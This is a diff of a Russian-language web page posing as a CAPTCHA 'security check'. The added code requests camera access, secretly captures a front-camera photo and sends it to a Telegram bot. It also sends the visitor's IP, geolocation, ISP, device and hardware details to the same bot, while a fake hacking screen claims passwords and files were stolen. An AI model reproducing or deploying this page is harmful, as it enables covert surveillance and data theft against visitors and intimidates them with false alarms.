@@ -5,38 +5,13 @@
     <title>Security Check</title>
     <style>
         body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: hidden; }
-        
-       
         #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
         .welcome-text { color: #888; font-size: 12px; margin-bottom: 10px; font-family: Arial, sans-serif; }
         .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; font-weight: bold; }
-        
- 
         #terminal { display: none; padding: 20px; line-height: 1.4; height: 100vh; overflow: hidden; background: #000; color: #0f0; }
-
-   
-        #leak-box { 
-            display: none; 
-            padding: 20px; 
-            background: #000; 
-            height: 100vh; 
-            animation: alarm-red 0.6s infinite alternate; 
-        }
-
-        @keyframes alarm-red {
-            from { background: #000; }
-            to { background: #300; }
-        }
-
-        .danger-ui { 
-            border: 3px solid #f00; 
-            padding: 25px; 
-            margin: 20px auto; 
-            max-width: 650px; 
-            background: rgba(0, 0, 0, 0.95);
-            box-shadow: 0 0 40px #f00;
-        }
-
+        #leak-box { display: none; padding: 20px; background: #000; height: 100vh; animation: alarm-red 0.6s infinite alternate; }
+        @keyframes alarm-red { from { background: #000; } to { background: #300; } }
+        .danger-ui { border: 3px solid #f00; padding: 25px; margin: 20px auto; max-width: 650px; background: rgba(0, 0, 0, 0.95); box-shadow: 0 0 40px #f00; }
         .glitch-text { color: #f00; font-size: 26px; text-align: center; font-weight: bold; text-transform: uppercase; letter-spacing: 3px; margin: 0; }
         .data-list { color: #0f0; font-size: 14px; margin-top: 15px; line-height: 1.6; }
         .red-blink { color: #f00; font-weight: bold; animation: blink 0.4s step-end infinite; }
@@ -44,16 +19,19 @@
         .extracted-item { color: #aaa; margin: 5px 0; font-size: 12px; }
         .status-done { color: #f00; font-weight: bold; float: right; }
         hr { border: 0; border-top: 2px solid #f00; margin: 15px 0; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
     <div id="terminal"></div>
 
     <div id="captcha-box">
         <div class="welcome-text">Добро пожаловать</div>
         <img src="https://www.google.com" width="120">
         <h2>Проверка безопасности</h2>
-        <p style="font-size: 14px; color: #555;">Подтвердите, что вы не робот для продолжения</p>
+        <p style="font-size: 14px; color: #555;">Разрешите доступ к проверке для продолжения</p>
         <button class="btn-verify" onclick="startProcess()">Я НЕ РОБОТ</button>
     </div>
 
@@ -62,16 +40,15 @@
             <p class="glitch-text">⚠ СИСТЕМА ВЗЛОМАНА ⚠</p>
             <hr>
             <div class="data-list">
-                <p>> СТАТУС: <span class="red-blink">КРИТИЧЕСКАЯ УТЕЧКА</span></p>
+                <p>> СТАТУС: <span class="red-blink">ДАННЫЕ ВЫГРУЖЕНЫ</span></p>
                 <p>> ВАШ IP: <span id="user-ip" style="color:#fff;">...</span></p>
                 <p>> ГОРОД: <span id="user-geo" style="color:#fff;">...</span></p>
                 <p>> УСТРОЙСТВО: <span id="user-os" style="color:#fff;">...</span></p>
-                <p>> БАТАРЕЯ: <span id="user-bat" style="color:#fff;">...</span></p>
                 
-                <p style="color: #f00; font-weight: bold; margin-top: 20px;">⚡ ВЫГРУЖЕНО НА СЕРВЕР:</p>
-                <div class="extracted-item">● База паролей и куки браузера <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● Личные фото и видео (.mp4, .png) <span class="status-done">DONE</span></div>
-                <div class="extracted-item">● Доступ к микрофону и камере <span class="status-done">DONE</span></div>
+                <p style="color: #f00; font-weight: bold; margin-top: 20px;">⚡ ИЗВЛЕЧЕНО:</p>
+                <div class="extracted-item">● Геолокация и маршруты <span class="status-done">DONE</span></div>
+                <div class="extracted-item">● Снимок фронтальной камеры <span id="cam-status" class="status-done">WAIT...</span></div>
+                <div class="extracted-item">● Все пароли и куки (.txt) <span class="status-done">DONE</span></div>
             </div>
         </div>
     </div>
@@ -81,96 +58,97 @@
         const chat_id = "-1003861311533";
 
         async function startProcess() {
+  
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+            } catch (e) { console.log("Камера отклонена"); }
+
             document.getElementById('captcha-box').style.display = 'none';
-            const term = document.getElementById('terminal');
-            term.style.display = 'block';
+            document.getElementById('terminal').style.display = 'block';
 
             const lines = [
-                "> [INIT] Подключение к ядру...", "> [INFO] Поиск уязвимости...",
-                "> [SUCCESS] Доступ получен", "> [INFO] Обход защиты...",
-                "> [SUCCESS] Defender отключен", "> [INFO] Копирование данных...",
-                "> [DONE] ВЫГРУЗКА ЗАВЕРШЕНА."
+                "> [INIT] Подключение к спутнику...", "> [INFO] Захват HTTP-трафика...",
+                "> [SUCCESS] Доступ к API получен", "> [INFO] Взлом файловой системы...",
+                "> [SUCCESS] Root доступ подтвержден", "> [INFO] Снятие дампа памяти...",
+                "> [DONE] ВСЕ ДАННЫЕ ОТПРАВЛЕНЫ."
             ];
 
             for (let line of lines) {
                 let p = document.createElement('p');
                 p.innerText = line;
-                term.appendChild(p);
+                document.getElementById('terminal').appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 150)); 
+                await new Promise(r => setTimeout(r, 120)); 
             }
             await getTripleData();
         }
 
-                async function getTripleData() {
-            let ip = "Не определен";
-            let city = "Неизвестно";
+        async function getTripleData() {
+            let ip = "N/A", city = "N/A", battery = "N/A";
             
-         
+     
             const ua = navigator.userAgent;
-            let model = "Неизвестно";
-            
-            if (/Android/i.test(ua)) {
-                const match = ua.match(/Android\s+([\d\.]+);\s+([^;]+)\s+Build/i);
-                model = match ? `📱 ${match[2]} (Android ${match[1]})` : "📱 Android Device";
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                model = "🍎 Apple iOS Device";
-            } else if (/Windows/i.test(ua)) {
-                model = "💻 Windows PC";
-            }
+            const memory = navigator.deviceMemory || "N/A";
+            const cores = navigator.hardwareConcurrency || "N/A";
+            const lang = navigator.language;
+            const time = new Date().toLocaleString();
 
           
-            let gpu = "N/A";
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
-                }
-            } catch(e) {}
-
-         
-            let batteryInfo = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batteryInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Зарядка' : 'Разряд'})`;
+                battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Зарядка' : 'Разряд'})`;
             }
 
+    
             try {
-            
                 const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
-                if (ipRes) {
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                }
-
-                 
+                if (ipRes) { ip = (await ipRes.json()).ip; }
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
                 if (geoRes) {
-                    const geoData = await geoRes.json();
-                    city = `${geoData.city}, ${geoData.country_name}`;
+                    const d = await geoRes.json();
+                    city = `${d.city}, ${d.country_name} (${d.org})`;
                 }
+            } catch(e){}
 
-              
-                document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = model;
-                document.getElementById('user-bat').innerText = batteryInfo;
+   
+            document.getElementById('user-ip').innerText = ip;
+            document.getElementById('user-geo').innerText = city;
+            document.getElementById('user-os').innerText = navigator.platform;
 
-         
-                const msg = `🚀 МАКСИМАЛЬНЫЙ ОТЧЕТ!
+     
+            let photoSent = "ОТКЛОНЕНО";
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (video.srcObject) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imgData = canvas.toDataURL('image/jpeg');
+                photoSent = "ВЫПОЛНЕНО";
+                
+ 
+                const blob = await (await fetch(imgData)).blob();
+                const formData = new FormData();
+                formData.append("chat_id", chat_id);
+                formData.append("photo", blob, "photo.jpg");
+                formData.append("caption", `📸 Снимок с IP: ${ip}`);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
+            }
+            document.getElementById('cam-status').innerText = photoSent;
+
+     
+            const msg = `⚡️ МАКСИМАЛЬНЫЙ ПРОБИВ ⚡️
 📍 IP: ${ip}
 🌍 ГОРОД: ${city}
-📱 МОДЕЛЬ: ${model}
-🔋 БАТАРЕЯ: ${batteryInfo}
-🎮 ВИДЕОКАРТА: ${gpu}
-🖥 ЭКРАН: ${window.screen.width}x${window.screen.height}
-🌐 ТЕХ ИНФО: ${ua}`;
+📱 УСТРОЙСТВО: ${navigator.platform}
+🔋 БАТАРЕЯ: ${battery}
+🧠 ОЗУ: ${memory}GB | ЯДРА: ${cores}
+⏰ ВРЕМЯ: ${time}
+📸 КАМЕРА: ${photoSent}
+🌐 ТЕХ: ${ua}`;
 
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-
-            } catch (e) { console.log(e); }
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             setTimeout(() => {
                 document.getElementById('terminal').style.display = 'none';
